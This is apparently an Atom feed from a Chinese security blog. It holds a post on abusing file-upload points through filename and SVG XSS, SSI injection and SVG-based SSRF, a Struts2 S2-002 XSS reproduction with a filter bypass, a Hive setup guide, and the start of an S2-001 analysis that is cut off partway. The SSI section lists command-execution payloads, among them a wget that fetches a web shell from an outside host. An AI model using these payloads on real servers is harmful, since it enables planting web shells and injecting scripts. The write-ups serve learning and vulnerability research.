<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Boogle&#39;s Blog</title>
  
  <subtitle>没有网络安全，就没有国家安全</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zhengbao.wang/"/>
  <updated>2019-04-20T15:36:40.243Z</updated>
  <id>https://zhengbao.wang/</id>
  
  <author>
    <name>boogle</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件上传功能的一些另类利用</title>
    <link href="https://zhengbao.wang/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%A6%E7%B1%BB%E5%88%A9%E7%94%A8/"/>
    <id>https://zhengbao.wang/文件上传功能的一些另类利用/</id>
    <published>2019-04-20T15:35:16.000Z</published>
    <updated>2019-04-20T15:36:40.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了解析。那么在这种情况下如何去挖掘上传点的其他一些利用方式呢，下面看一下大佬们的其他骚操作。</p><h2 id="0x01-XSS"><a href="#0x01-XSS" class="headerlink" title="0x01 XSS"></a>0x01 XSS</h2><p>关于利用文件上传的XSS,早在16年大佬就给出了多种利用方式：<a href="http://brutelogic.com.br/blog/file-upload-xss/" target="_blank" rel="noopener">File Upload XSS</a></p><h3 id="文件名xss"><a href="#文件名xss" class="headerlink" title="文件名xss"></a>文件名xss</h3><p>windows下文件名不能包含 <code>/ \ : * ? “ &lt; &gt; |</code> 字符，而linux下是可以出现除 <code>/</code> 字符之外的其它所有的字符，而且在Linux系统中可以使用长文件或目录名，直接利用这个特性，在上传点没有对文件名进行检测和处理的情况下就可以实现XSS攻击。</p><h3 id="svg文件"><a href="#svg文件" class="headerlink" title="svg文件"></a>svg文件</h3><p>svg它的英文全称为Scalable Vector Graphics，意思为可缩放的矢量图形，是一种图片文件格式。当服务端允许上传svg类型的文件时，可进行Xss。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attribute">onload</span>=<span class="string">"alert("</span>svg-xss")/&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/20/5cbb33464fbca.png" alt></p><h2 id="0x02-SSI-Injection"><a href="#0x02-SSI-Injection" class="headerlink" title="0x02 SSI Injection"></a>0x02 SSI Injection</h2><p>SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。<br>详细参考<a href="https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection</a></p><p>也就说一个web服务如果开启了SSI功能，即可通过上传<code>shtml</code>进行文件读取甚至命令执行。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">Linux:</span><br><span class="line"></span><br><span class="line">List files <span class="keyword">of</span> directory:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="ls" --&gt;</span><br><span class="line">Access directories:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="cd /root/dir/"&gt;</span><br><span class="line">Execution script:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span><br><span class="line">Windows:</span><br><span class="line"></span><br><span class="line">List files <span class="keyword">of</span> directory:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="dir" --&gt;</span><br><span class="line">Access directories:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="cd C:\admin\dir"&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0X03-SSRF"><a href="#0X03-SSRF" class="headerlink" title="0X03 SSRF"></a>0X03 SSRF</h2><p>参考<a href="https://nosec.org/home/detail/2305.html" target="_blank" rel="noopener">利用SVG图片和SSRF收集服务器内部信息</a><br>该利用同样需要支持上传<code>svg</code>文件，由于它是xml结构，所以支持各种xml特性，其中一个特性是XLink，支持在xml文档中创建内部或外部的超链接。<br>上传<code>ssrf.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns:svg</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"200"</span>&gt;</span><span class="tag">&lt;<span class="name">image</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">xlink:href</span>=<span class="string">"http://192.168.111.149:3000/?ssrfsvg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/20/5cbb3846adbf8.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="https://zhengbao.wang/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计入门之s2-002复现分析</title>
    <link href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-002%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://zhengbao.wang/java代码审计入门之s2-002复现分析/</id>
    <published>2019-04-17T04:25:20.000Z</published>
    <updated>2019-04-17T08:30:01.754Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>入门JAVA代码审计的第二篇文章，复现分析<code>S2-002</code> xss漏洞。</p><p>本篇在漏洞分析的基础上，重点追踪了struts2标签解析过程。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>官方公告中给出的漏洞影响版本为Struts 2.0.0 - Struts 2.0.11，因此本环境可以在之前分析<code>s1-001</code>漏洞环境上搭建，可参考前面的文章<a href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">java代码审计入门之s2-001复现分析</a></p><p>在上面环境的基础上，继续创建<code>xss_test.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-002<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;s:url action="</span><span class="attr">Xss</span>" <span class="attr">includeParams</span>=<span class="string">"all"</span> &gt;</span><span class="tag">&lt;/<span class="name">s:url</span>&gt;</span>"&gt;你好Struts2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>创建<code>Xss.java</code> class<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.<span class="type">ActionSupport</span>;</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Xss</span>  <span class="keyword">extends</span> <span class="title">ActionSupport</span></span>&#123;</span><br><span class="line">    public <span class="type">String</span> execute() <span class="keyword">throws</span> <span class="type">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="type">SUCCESS</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>struct.xml</code>中添加<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;action <span class="built_in">name</span>=<span class="string">"Xss"</span> <span class="built_in">class</span>=<span class="string">"com.demo.action.Xss"</span>&gt;</span><br><span class="line">        &lt;<span class="literal">result</span> <span class="built_in">name</span>=<span class="string">"success"</span>&gt;xss_test.jsp&lt;/<span class="literal">result</span>&gt;</span><br><span class="line">&lt;/action&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5e4019070d.png" alt></p><h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>首先看一下官方关于漏洞的描述<br><img src="https://i.loli.net/2019/04/16/5cb5e6016f1be.png" alt><br>可以看到漏洞主要原因是Struts 2框架在处理<code>&lt;s:url&gt;</code> 和<code>&lt;s:a&gt;</code>标签时，未对标签内的字符进行转义，导致XSS漏洞。<br>在我们搭建的Demo中，以<code>&lt;s:url&gt;</code>标签为例进行分析<br>这里需要说明的是struts2允许使用自定义的其自定义的标签，如上面的<code>&lt;s:url&gt;</code>即为struct2 url标签。在使用struts2标签时需在页面中添加<code>&lt;%@ taglib uri =&quot;/struts-tags&quot; prefix =&quot;s&quot; %&gt;</code>。引入标签配置。该配置在<code>struts2-core</code>核心jar包中,<code>META-INF/struts-tags.tld</code>对struts2标签进行了定义。<br>比如我们本次使用的<code>&lt;s:url&gt;</code><br><img src="https://i.loli.net/2019/04/17/5cb6999ce1263.png" alt><br><code>&lt;tag-class&gt;org.apache.struts2.views.jsp.URLTag&lt;/tag-class&gt;</code>说明了标签的具体实现类为<code>org.apache.struts2.views.jsp.URLTag</code><br><img src="https://i.loli.net/2019/04/17/5cb69a62d7947.png" alt><br>在本例中<code>&lt;s:url&gt;</code>标签在<code>xss_test.jps</code>中，jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，当struts2在解析到标签时，实际上是继承了http servlet中可扩展的BodyTagSupport类。<br>然后依次执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">doStartTag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">setBodyContent</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doInitBody</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doAfterBody</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doEndTag</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p><p>我们从<code>doStartTag</code>方法下断开始跟踪。<br>使用payload访问<code>localhost:8080/test_war_exploded/Xss.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;=boogle</code><br><img src="https://i.loli.net/2019/04/17/5cb693baf10db.png" alt><br>在<code>doStartTag</code>方法中通过<code>gettBean()</code>方法获取URL组件,然后通过<code>populateParams()</code>方法对获取的URL组件中属性进行赋值。<br>然后执行<code>this.component.start(this.pageContext.getOut())</code>方法，即前面提到的<code>URL</code>组件的start方法。<br>跟进该方法<br><img src="https://i.loli.net/2019/04/17/5cb69cedead85.png" alt><br>首先会判断<code>&lt;s:url&gt;</code>标签中设置的<code>includeParams</code>参数，该属性有三个值：<code>none</code> <code>get</code> <code>all</code>，默认值为get。属性值为get时，该url会将访问其所在jsp的的请求的所有get方法的参数添加到自身来 ，属性值为all时更是将get和post的的参数值全部添加到自身来，属性值为none时不添加。<br>本例中我们设置的参数值为<code>all</code>，之后便进入到<code>includeParams</code>值为<code>all</code>的流程，执行<code>mergeRequestParameters</code>方法。<br>跟进<br><img src="https://i.loli.net/2019/04/17/5cb69f9785c27.png" alt><br>在该方法中取到我们的payload，并保存在<code>parameters</code>中。<br>然后回到URL组件的<code>start</code>方法中，继续执行进入到<code>includeGetParameters</code>方法。<br><img src="https://i.loli.net/2019/04/17/5cb6a10e054a2.png" alt><br>该方法中使用<code>extractQueryString</code>方法获得参数信息，该方法会直接调用<code>HttpServletRequest</code>的<code>getQueryString</code>的方法直接获取浏览器发送的请求信息。<br>之后又调用<code>UrlHelper.parseQueryString(query)</code>以<code>&amp;</code>为分隔符将获取的请求信息分隔出不同的参数。将参数保存在<code>queryParams</code><br><img src="https://i.loli.net/2019/04/17/5cb6a41aafcce.png" alt><br>在该过程中会对参数的value值使用<code>translateAndDecode</code>编码处理，而不会对参数name进行任何处理。<br>然后继续执行进入<code>mergeRequestParameters</code>将参数名称和值保存到<code>parameters</code>中。<br>至此<code>doStartTag</code>工作完成，然后进入到<code>doEndTag</code>方法<br><img src="https://i.loli.net/2019/04/17/5cb6a5dcce68a.png" alt><br>然后进入<code>end</code>方法，实现对标签的内容渲染工作。<br><img src="https://i.loli.net/2019/04/17/5cb6a836a26eb.png" alt></p><h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">if</span> the action was <span class="keyword">not</span> explicitly <span class="built_in">set</span> grab the params <span class="keyword">from</span> the request</span><br><span class="line">        <span class="keyword">if</span> (escapeAmp) &#123;</span><br><span class="line">            buildParametersString(params, link);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            buildParametersString(params, link, <span class="string">"&amp;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="literal">result</span> = link.toString();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">result</span>.indexOf(<span class="string">"&lt;script&gt;"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="literal">result</span> = <span class="literal">result</span>.replaceAll(<span class="string">"&lt;script&gt;"</span>, <span class="string">"script"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="literal">result</span> = encodeResult ? response.encodeURL(<span class="literal">result</span>) : <span class="literal">result</span>;</span><br><span class="line">        &#125; catch (<span class="type">Exception</span> ex) &#123;</span><br><span class="line">            // <span class="type">Could</span> <span class="keyword">not</span> encode the <span class="type">URL</span> <span class="keyword">for</span> some reason</span><br><span class="line">            // <span class="type">Use</span> it unchanged</span><br><span class="line">            <span class="literal">result</span> = link.toString();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>补丁使用<code>while</code>循环对<code>&lt;script&gt;</code>进行去除，仍可使用<code>&lt;script boogle&gt;</code>样式绕过。<br>payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">boogle</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>=boogle</span><br></pre></td></tr></table></figure></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p><a href="https://www.angelwhu.com/blog/?p=312" target="_blank" rel="noopener">Struts2标签原理分析</a><br><a href="https://www.iflym.com/index.php/code/resolve-error-codec-problem-while-use-s-url-or-s-a-on-struts2.html" target="_blank" rel="noopener">https://www.iflym.com/index.php/code/resolve-error-codec-problem-while-use-s-url-or-s-a-on-struts2.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;入门JAVA代码审计的第二篇文章，复现分析&lt;code&gt;S2-002&lt;/code&gt; xss漏洞。&lt;/p
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="https://zhengbao.wang/tags/java/"/>
    
      <category term="struts2" scheme="https://zhengbao.wang/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>Centos7配置安装HIVE</title>
    <link href="https://zhengbao.wang/Centos7%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85HIVE/"/>
    <id>https://zhengbao.wang/Centos7配置安装HIVE/</id>
    <published>2019-04-17T02:00:30.000Z</published>
    <updated>2019-04-17T02:01:38.533Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自<a href="https://www.yiibai.com/hive/" target="_blank" rel="noopener">https://www.yiibai.com/hive/</a></p><p>本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考<a href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a></p><h2 id="0x01-配置安装HIVE"><a href="#0x01-配置安装HIVE" class="headerlink" title="0x01 配置安装HIVE"></a>0x01 配置安装HIVE</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先<a href="http://www.apache.org/dyn/closer.cgi/hive/" target="_blank" rel="noopener">下载HIVE</a>,为了与Hadoop3.2.0,我选择的hive版本为3.1.1</p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>下载完成后进行解压，根据解压目录自行配置环境变量<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="selector-class">.bashrc</span>   <span class="comment">//配置环境变量</span></span><br><span class="line">source <span class="selector-class">.bashrc</span>  <span class="comment">//使配置生效</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/17/5cb681dc428fd.png" alt></p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>移动到HIVE安装目录下的<code>conf</code>文件夹执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp hive-env<span class="selector-class">.sh</span><span class="selector-class">.template</span> hive-env<span class="selector-class">.sh</span> </span><br><span class="line"></span><br><span class="line">cp hive-default<span class="selector-class">.xml</span><span class="selector-class">.template</span> hive-site<span class="selector-class">.xml</span> </span><br><span class="line"></span><br><span class="line">cp hive-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-log4j2<span class="selector-class">.properties</span> </span><br><span class="line"></span><br><span class="line">cp hive-exec-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-exec-log4j2.properties</span><br></pre></td></tr></table></figure></p><p>修改hive-env.sh,添加JAVA_HOME,HADOOP_HOME及HIVE配置文件目录，请根据自己环境自行修改如下<br><img src="https://i.loli.net/2019/04/17/5cb682abe5216.png" alt></p><h3 id="Schema初始化"><a href="#Schema初始化" class="headerlink" title="Schema初始化"></a>Schema初始化</h3><p>执行<code>schematool -initSchema -dbType derby</code><br>执行成功效果如下<br><img src="https://i.loli.net/2019/04/17/5cb68361a0619.png" alt><br>如果执行failed，修改<code>hive-3.1.1/scripts/metastore/upgrade/derby</code>目录下的<code>hive-schema-2.1.0.derby.sql</code><br>按下图将框中内容使用注释符<code>--</code>注释<br><img src="https://i.loli.net/2019/04/17/5cb68443d23f9.png" alt><br>重新执行<code>schematool -initSchema -dbType derby</code></p><h3 id="启动HIVE"><a href="#启动HIVE" class="headerlink" title="启动HIVE"></a>启动HIVE</h3><p>Schema初始化成功后即可启动hive，命令<code>hive</code><br>启动成功如下，如出现报错，请移至文末<code>0x03 问题解决</code>查看笔者记录部分问题解决方法<br><img src="https://i.loli.net/2019/04/17/5cb68865ee29e.png" alt></p><h2 id="0x02-HIVE命令"><a href="#0x02-HIVE命令" class="headerlink" title="0x02 HIVE命令"></a>0x02 HIVE命令</h2><p><img src="https://i.loli.net/2019/04/17/5cb6889618cb6.png" alt><br>详细命令参考<a href="https://www.jianshu.com/p/b1fafc1bdb03" target="_blank" rel="noopener">Hive常用命令</a></p><h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><h3 id="expansion-character问题"><a href="#expansion-character问题" class="headerlink" title="expansion character问题"></a>expansion character问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6858693bc8.png" alt><br>解决方法：修改报错的<code>hive-site.xml</code>,将报错位置<code>3210</code>行第96个字符删掉</p><h3 id="system-xxx-路径错误问题"><a href="#system-xxx-路径错误问题" class="headerlink" title="${system:xxx}路径错误问题"></a>${system:xxx}路径错误问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6869fbfe64.png" alt><br>出现该问题的主要原因是hive配置文件中不能使用冒号目录定义方法，可将其直接修改为目录。<br>如配置文件中用<code>${system:java.io.tmpdir}</code>定义的路径改为<code>/tmp/</code>,<code>${system:user.name}</code>定义的路径改为<code>${user.name}</code>，其他类似<br>可使用<code>cat -n hive-site.xml |grep system:</code>定位到出现问题的位置<br><img src="https://i.loli.net/2019/04/17/5cb687a138126.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
      <category term="hive" scheme="https://zhengbao.wang/tags/hive/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计入门之s2-001复现分析</title>
    <link href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://zhengbao.wang/java代码审计入门之s2-001复现分析/</id>
    <published>2019-04-13T09:56:47.000Z</published>
    <updated>2019-04-17T08:32:59.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>入门JAVA代码审计的第一篇文章，还是决定以漏洞之王<code>struts2</code>下手，本篇即以学习为目的，复现分析<code>S2-001</code>,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>官方给出的漏洞影响版本为WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8。<br>本例中使用struts-2.0.1版本进行复现分析。</p><p>工具选择使用了<code>IDEA</code>，下面记录一下如何使用<code>IDEA</code>创建第一个struts2项目。<br>IDEA需下载<code>Ultimate</code>版本,<code>Community</code>版本无法创建<code>Java EE</code>工程。<br>首先<code>New Project</code>创建<code>Struts2</code>项目，<code>Libraries</code>选择<code>Set up library later</code><br><img src="https://i.loli.net/2019/04/13/5cb199d238fb8.png" alt><br>下一步之后填写项目名称即可创建起一个struts2 project<br><img src="https://i.loli.net/2019/04/13/5cb19a73c7b2b.png" alt><br>下载<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">struts-2.0.1-all</a></p><p>在项目目录<code>WEB-INF</code>下新建<code>lib</code>文件夹，将所需要的jar包从下载目录中导入到<code>lib</code>文件夹下</p><p>将全部jar包选中，右键<code>Add as Library</code><br><img src="https://i.loli.net/2019/04/13/5cb1a68f2cf2d.png" alt><br>填写一个Library Name<br><img src="https://i.loli.net/2019/04/13/5cb19dbb0a748.png" alt><br>然后<code>File-&gt;Project strutsure</code><br><img src="https://i.loli.net/2019/04/13/5cb19e06e4c46.png" alt><br>然后在<code>Modules</code>下选中<code>struts2-001</code><br><img src="https://i.loli.net/2019/04/13/5cb1a74e548e5.png" alt><br>之后再在<code>Artifacts</code>如下图将<code>struts2-001</code>put into output root，完成后点击OK.<br><img src="https://i.loli.net/2019/04/13/5cb19efb3dc76.png" alt><br>之后按下图创建<code>Tomcat server</code><br><img src="https://i.loli.net/2019/04/13/5cb1a09665c32.png" alt><br>在配置页面点击<code>Fix</code>,其他默认即可。<br><img src="https://i.loli.net/2019/04/13/5cb1a0d149c67.png" alt><br>至此即可看到一个struts2项目启动成功。<br><img src="https://i.loli.net/2019/04/13/5cb1a7b081bbd.png" alt><br>因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。<br>在<code>WEB</code>目录下修改<code>index.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 